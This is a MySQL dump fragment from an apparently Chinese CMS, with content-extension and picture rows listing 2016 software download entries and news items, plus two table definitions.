INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (101,'迅雷9',NULL,NULL,NULL,NULL,'迅雷9是“深圳市迅雷网络技术有限公司”于2016年推出的“迅雷”系列下载软件的最新换代产品。迅雷9采用全新下载引擎，对百兆光纤宽带网络环境进行诸多针对性的优化，让用户获得更卓越的下载体验；全新的界面功能布局，承载了更丰富的内容，打造找、下、用的一站式娱乐消费平台。','2016-10-10 11:16:31',NULL,NULL,NULL,0,'/u/cms/www/201610/10111618rhdk.jpg','/u/cms/www/201610/10111549rupn.jpg','/u/cms/www/201610/101116034e14.jpg',NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (102,'360安全卫士',NULL,NULL,NULL,NULL,NULL,'2016-10-10 11:19:18',NULL,NULL,NULL,0,'/u/cms/www/201610/101119092w8r.jpg','/u/cms/www/201610/101119026ukx.jpg',NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (103,'搜狗输入法',NULL,NULL,NULL,NULL,NULL,'2016-10-10 11:21:37',NULL,NULL,NULL,0,'/u/cms/www/201610/101120330mpz.jpg','/u/cms/www/201610/10112023kqfp.jpg',NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (104,'YY语音',NULL,NULL,NULL,NULL,NULL,'2016-10-10 11:27:17',NULL,NULL,NULL,0,'/u/cms/www/201610/10112706jiii.jpg','/u/cms/www/201610/10112657zklb.jpg',NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (105,'阿里旺旺',NULL,NULL,NULL,NULL,NULL,'2016-10-10 11:28:52',NULL,NULL,NULL,0,'/u/cms/www/201610/10112845wryq.jpg','/u/cms/www/201610/10112839cvwx.jpg',NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (106,'爱奇艺视频',NULL,NULL,NULL,NULL,NULL,'2016-10-10 11:30:54',NULL,NULL,NULL,0,'/u/cms/www/201610/101130399dbt.jpg','/u/cms/www/201610/10113032zu0k.jpg',NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (107,'谷歌浏览器',NULL,NULL,NULL,NULL,NULL,'2016-10-10 11:32:35',NULL,NULL,NULL,0,'/u/cms/www/201610/10113226knhj.jpg','/u/cms/www/201610/10113218ya2p.jpg',NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (108,'360浏览器',NULL,NULL,NULL,NULL,NULL,'2016-10-10 11:34:05',NULL,NULL,NULL,0,'/u/cms/www/201610/10113400utfn.jpg','/u/cms/www/201610/10113354g71e.jpg',NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (109,'PPTV聚力',NULL,NULL,NULL,NULL,NULL,'2016-10-10 11:35:26',NULL,NULL,NULL,0,'/u/cms/www/201610/1011351336l0.jpg','/u/cms/www/201610/10113506jz07.jpg',NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (110,'腾讯视频',NULL,NULL,NULL,NULL,NULL,'2016-10-10 11:36:32',NULL,NULL,NULL,0,'/u/cms/www/201610/101135560ne4.jpg','/u/cms/www/201610/10113551yru8.jpg',NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (111,'专访百度科学家徐伟：百度比谷歌的人工智能平台更易上手',NULL,NULL,NULL,NULL,'“开发者在使用时，学习成本较低，这是我们平台易用性的体现。”负责搭建百度深度学习平台PaddlePaddle的百度美国研究院科学家徐伟22日在接受腾讯科技专访时表示。','2016-10-10 11:45:47',NULL,'CK',NULL,0,NULL,NULL,'/u/cms/www/201610/10114452yjhh.jpg',NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (112,'电信诈骗多发产生“蝴蝶效应”虚拟运营商融资受波及',NULL,NULL,NULL,NULL,'自2013年12月首批企业获牌以来，虚拟运营商发展迅速，目前已有42家企业获得牌照。9月22日，在“ICT中国· 2016高层论坛”移动转售分论坛上，中国通信企业协会披露，目前移动转售业务用户数已超3500万，占全国移动用户人数2.67%。','2016-10-10 11:48:08',NULL,'CK',NULL,0,NULL,NULL,'/u/cms/www/201610/10114704dsba.jpg',NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (113,'李克强联合国承诺援助难民：这是责任和道义的担当',NULL,NULL,NULL,NULL,'李克强总理首赴联合国，首场活动便是出席由联合国倡议举行的联大解决难移民大规模流动问题高级别会议。','2016-10-10 11:50:03',NULL,'CK',NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (114,'科学家研制“隐身潜水服” 跟鲨鱼同游也不怕被发现',NULL,NULL,NULL,NULL,NULL,'2016-10-10 13:11:12',NULL,NULL,NULL,0,NULL,NULL,'/u/cms/www/201610/101308178wzr.jpg',NULL,NULL,1,NULL,NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (115,'四川石渠发现至少30万公顷珍贵泥炭湿地资源',NULL,NULL,NULL,NULL,NULL,'2016-10-10 13:15:37',NULL,NULL,NULL,0,NULL,NULL,'/u/cms/www/201610/101314450fs1.jpg',NULL,NULL,1,NULL,NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (116,'全世界最孤独的咖啡馆：海拔4860米 达古冰川之巅',NULL,NULL,NULL,NULL,NULL,'2016-10-10 13:19:22',NULL,NULL,NULL,0,NULL,NULL,'/u/cms/www/201610/10131742wzhv.jpg',NULL,NULL,1,NULL,NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (117,'中俄“合作－2016”联合反恐训练圆满结束',NULL,NULL,NULL,NULL,NULL,'2016-10-10 13:22:07',NULL,NULL,NULL,0,NULL,NULL,'/u/cms/www/201610/101320442qbi.jpg',NULL,NULL,1,NULL,NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (118,'探访燕城监狱：蔬菜自己种 午餐两菜一汤',NULL,NULL,NULL,NULL,NULL,'2016-10-10 13:23:50',NULL,NULL,NULL,0,NULL,NULL,'/u/cms/www/201610/10132253w0rj.jpg',NULL,NULL,1,NULL,NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (119,'摄影师拍摄巨鳄破水而出吞食猎物 上演一箭双雕',NULL,NULL,NULL,NULL,NULL,'2016-10-10 13:26:38',NULL,NULL,NULL,0,NULL,NULL,'/u/cms/www/201610/101326014zdc.jpg',NULL,NULL,1,NULL,NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (120,'宛如置身黑客帝国 “啤酒丛林”惊艳青岛海滨夜空',NULL,NULL,NULL,NULL,NULL,'2016-10-10 13:35:17',NULL,NULL,NULL,0,NULL,NULL,'/u/cms/www/201610/10133449hwwr.jpg',NULL,NULL,1,NULL,NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (121,'《半妖倾城》爱与恨，追与逃，人与妖再一次掀起一段的惊人的倾城传奇',NULL,NULL,NULL,NULL,'清末，八国联军攻入北京，聂如风带着妻子应蝶和二个女儿躲避追杀，应蝶策马将如风和女儿赶走，独自迎敌，应蝶突然长出雪白的翅膀飞了起来——原来她竟然是妖.','2016-10-10 13:38:11','/u/cms/www/201610/101338015yhf.mp4','CK',NULL,0,'/u/cms/www/201610/10133842aiyf.png',NULL,'/u/cms/www/201610/10133710to3f.jpg',NULL,NULL,1,NULL,NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (122,'《那年青春我们正好》刘诗诗、种丹妮演绎闺蜜',NULL,NULL,NULL,NULL,'《那年青春我们正好》在浙江卫视、东方卫视热播。种丹妮饰演的韩露“花痴”肖小军（郑恺），与闺蜜刘婷（刘诗诗）同爱一人而“掰面”。','2016-10-10 13:40:05','/u/cms/www/201610/101338015yhf.mp4','CK',NULL,0,'/u/cms/www/201610/101340004te2.png',NULL,'/u/cms/www/201610/10133954jfoc.jpg',NULL,NULL,1,NULL,NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (123,'《奔跑吧兄弟》收官对决一触即发 邓超被岳云鹏压垮惨叫',NULL,NULL,NULL,NULL,'跑男搭档助阵勇士,力争宇宙最强者称号,究竟“跑男团们都有着怎样神奇的能力？最终谁又将在“助力勇士”的帮助下赢得本季“宇宙最强者”的称号呢？','2016-10-10 13:41:03','/u/cms/www/201610/101338015yhf.mp4','CK',NULL,0,'/u/cms/www/201610/101340393eav.png',NULL,'/u/cms/www/201610/10134048htcl.jpg',NULL,NULL,1,NULL,NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (124,'李克强出席加拿大总理家宴 小小特鲁多表演后空翻',NULL,NULL,NULL,NULL,NULL,'2016-10-10 13:42:48','/u/cms/www/201610/101338015yhf.mp4','CK',NULL,0,NULL,NULL,'/u/cms/www/201610/10134238qppo.jpg',NULL,NULL,1,NULL,NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (125,'习主席和中央军委领导推进军队战斗力建设纪实',NULL,NULL,NULL,NULL,NULL,'2016-10-10 13:44:47','/u/cms/www/201610/101338015yhf.mp4','CK',NULL,0,NULL,NULL,'/u/cms/www/201610/10134440wmng.jpg',NULL,NULL,1,NULL,NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (126,'西北第一村白哈巴的早秋',NULL,NULL,NULL,NULL,NULL,'2016-10-10 13:46:01','/u/cms/www/201610/101338015yhf.mp4','CK',NULL,0,NULL,NULL,'/u/cms/www/201610/101345564pok.jpg',NULL,NULL,1,NULL,NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (127,'美国金秋不止红叶',NULL,NULL,NULL,NULL,NULL,'2016-10-10 13:46:26','/u/cms/www/201610/101338015yhf.mp4','CK',NULL,0,NULL,NULL,'/u/cms/www/201610/101346227ayf.jpg',NULL,NULL,1,NULL,NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (128,'德国举行南瓜称重比赛 763公斤南瓜获得加冕',NULL,NULL,NULL,NULL,NULL,'2016-10-10 13:46:52','/u/cms/www/201610/101338015yhf.mp4','CK',NULL,0,NULL,NULL,'/u/cms/www/201610/101346473kic.jpg',NULL,NULL,1,NULL,NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (129,'北京特战队员魔鬼周训练 挑战50项最严苛极限项目',NULL,NULL,NULL,NULL,NULL,'2016-10-10 13:47:24','/u/cms/www/201610/101338015yhf.mp4','CK',NULL,0,NULL,NULL,'/u/cms/www/201610/10134720z8a5.jpg',NULL,NULL,1,NULL,NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (130,'党中央推进民族工作创新发展纪实',NULL,NULL,NULL,NULL,'奏响新形势下民族工作新乐章（治国理政新思想新实践）党的十八大以来以习近平同志为总书记的党中央推进民族工作创新发展纪实。','2016-10-10 13:51:07',NULL,'CK',NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (131,'楼市调控应跳出周期性怪圈',NULL,NULL,NULL,NULL,'每一轮调控政策都是为稳定住房价格，但调控过后，总有一轮快速上涨行情，越让普通百姓感叹房子越来越买不起了。显然，目前楼市调控实质已陷入越调越高和政府“助涨”的尴尬局面。','2016-10-10 13:54:05',NULL,'CK',NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (132,'黄金接连下跌难道又等大妈来托盘',NULL,NULL,NULL,NULL,'三年前，中国大妈们抢购黄金的记忆还历历在目，没想到如今的黄金又开始了一轮又一轮的下跌。','2016-10-10 13:55:46',NULL,'CK',NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (140,'安卓游戏开发5险1金',NULL,NULL,NULL,NULL,NULL,'2016-10-10 14:27:44',NULL,NULL,NULL,0,NULL,NULL,NULL,NULL,NULL,1,'',NULL,NULL);
INSERT INTO `jc_content_ext` (`content_id`,`title`,`short_title`,`author`,`origin`,`origin_url`,`description`,`release_date`,`media_path`,`media_type`,`title_color`,`is_bold`,`title_img`,`content_img`,`type_img`,`link`,`tpl_content`,`need_regenerate`,`tpl_mobile_content`,`toplevel_date`,`pigeonhole_date`) VALUES (141,'乌兰布统牧歌秋韵',NULL,NULL,NULL,NULL,NULL,'2016-10-11 09:44:23',NULL,NULL,NULL,0,NULL,NULL,'/u/cms/www/201610/11093237z5e8.jpg',NULL,NULL,1,NULL,NULL,NULL);

#
# Source for table jc_content_group_view
#

CREATE TABLE `jc_content_group_view` (
  `content_id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  PRIMARY KEY (`content_id`,`group_id`),
  KEY `fk_jc_content_group_v` (`group_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容浏览会员组关联表';

#
# Dumping data for table jc_content_group_view
#


#
# Source for table jc_content_picture
#

CREATE TABLE `jc_content_picture` (
  `content_id` int(11) NOT NULL,
  `priority` int(11) NOT NULL COMMENT '排列顺序',
  `img_path` varchar(100) NOT NULL COMMENT '图片地址',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  PRIMARY KEY (`content_id`,`priority`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容图片表';

#
# Dumping data for table jc_content_picture
#

INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (2,0,'/u/cms/www/201607/15154302mvu4.jpg','当地时间2016年7月5日报道，美国宇航局“朱诺”号探测器成功进入环绕木星轨道，将展开探寻木星起源的任务。');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (2,1,'/u/cms/www/201607/15154338b6h9.jpg','据悉，“朱诺”号将环绕木星运行20个月，收集有关该行星核心的数据，描绘其磁场，并测量大气中水和氨的含量。');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (2,2,'/u/cms/www/201607/15154354xp50.jpg','另外，“朱诺”号还会观察木星表面著名的大红斑，一个持续了数百年的风暴，从而揭示其深层的秘密。');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (2,3,'/u/cms/www/201607/15154421y33m.jpg','美国“朱诺”号探测器成功进入环绕木星轨道');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (7,0,'/u/cms/www/201607/15153012bpfd.jpg','旅行类冠军：浓雾中的意大利阿西西圣弗兰西斯大教堂。摄影：Francesco Cattuto');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (7,1,'/u/cms/www/201607/15153034m1rr.jpg','旅行类亚军：澳大利亚凯布尔海滩上的一队骆驼。摄影：Todd Kennedy');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (7,2,'/u/cms/www/201607/15153052j190.jpg','旅行类季军：大加纳利岛上色彩斑斓的Playa de Amadores海滩。 摄影：Karolis Janulis');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (7,3,'/u/cms/www/201607/15153110yn2c.jpg','自然与野生动物类冠军：丹麦Kalbyris森林。摄影：Michael Bernholdt');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (7,4,'/u/cms/www/201607/15153127qs41.jpg','自然与野生动物类亚军：罗马尼亚Marpod公路旁的一大群羊。摄影：Szabolcs Ignacz');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (7,5,'/u/cms/www/201607/15153212rjvo.jpg','自然与野生动物类季军：留尼旺岛富尔奈斯活火山喷发的壮观景象。摄影：Jonathan Payet');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (7,6,'/u/cms/www/201607/1515325323eh.jpg','体育冒险类冠军：攀登者在美国犹他州莫泊峡谷120米处攀爬。摄影：Max Seigal');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (7,7,'/u/cms/www/201607/15153307441e.jpg','体育冒险类亚军：在哥伦比亚库库塔举行的游泳比赛。摄影：Juan Pablo Bayona');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (7,8,'/u/cms/www/201607/15153321t1g3.jpg','体育冒险类季军：在美国阿拉斯加州科尔多瓦沙滩上玩滑板。摄影：Tj Balon');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (13,0,'/u/cms/www/201607/19141216070j.jpg','7月18日，中国空军新闻发言人申进科大校在北京宣布：中国空军近日组织了航空兵赴南海战斗巡航。这次南海战巡，空军出动轰-6K飞机赴黄岩岛等岛礁附近空域进行了巡航。');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (13,1,'/u/cms/www/201607/19141242pppk.jpg','申进科介绍，中国空军航空兵此次赴南海例行性战斗巡航，紧贴使命任务和实战准备，轰-6K和歼击机、侦察机、空中加油机等遂行战巡任务，以空中侦察、对抗空战和岛礁巡航为主要样式组织行动，达成了战斗巡航目的。\r\n申进科表示：“根据有效履行空军使命任务的需要，空军航空兵赴南海战斗巡航，将继续常态化进行。”');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (114,0,'/u/cms/www/201610/101310383u27.jpg','科学家研制“隐身潜水服” 跟鲨鱼同游也不怕被发现');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (114,1,'/u/cms/www/201610/101311003aey.jpg','科学家研制“隐身潜水服” 跟鲨鱼同游也不怕被发现');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (114,2,'/u/cms/www/201610/101311098e8w.jpg','科学家研制“隐身潜水服” 跟鲨鱼同游也不怕被发现');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (115,0,'/u/cms/www/201610/10131516fhw7.jpg','四川石渠发现至少30万公顷珍贵泥炭湿地资源');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (115,1,'/u/cms/www/201610/101315235s7b.jpg','四川石渠发现至少30万公顷珍贵泥炭湿地资源');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (115,2,'/u/cms/www/201610/101315314qdt.jpg','四川石渠发现至少30万公顷珍贵泥炭湿地资源');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (116,0,'/u/cms/www/201610/10131759kpti.jpg','/u/cms/www/201610/10131742wzhv.jpg');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (116,1,'/u/cms/www/201610/10131811udfh.jpg','/u/cms/www/201610/10131742wzhv.jpg');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (117,0,'/u/cms/www/201610/1013205987uh.jpg','中俄“合作－2016”联合反恐训练圆满结束');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (117,1,'/u/cms/www/201610/10132108kvcd.jpg','中俄“合作－2016”联合反恐训练圆满结束');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (117,2,'/u/cms/www/201610/10132117q0se.jpg','中俄“合作－2016”联合反恐训练圆满结束');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (117,3,'/u/cms/www/201610/10132128e9mz.jpg','中俄“合作－2016”联合反恐训练圆满结束');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (117,4,'/u/cms/www/201610/101321427ybi.jpg','中俄“合作－2016”联合反恐训练圆满结束');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (118,0,'/u/cms/www/201610/10132256evzu.jpg','探访燕城监狱：蔬菜自己种 午餐两菜一汤');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (118,1,'/u/cms/www/201610/10132301wue2.jpg','探访燕城监狱：蔬菜自己种 午餐两菜一汤');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (118,2,'/u/cms/www/201610/101323052xt2.jpg','探访燕城监狱：蔬菜自己种 午餐两菜一汤');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (118,3,'/u/cms/www/201610/10132310d08y.jpg','探访燕城监狱：蔬菜自己种 午餐两菜一汤');
INSERT INTO `jc_content_picture` (`content_id`,`priority`,`img_path`,`description`) VALUES (118,4,'/u/cms/www/201610/10132315avlw.jpg','探访燕城监狱：蔬菜自己种 午餐两菜一汤');
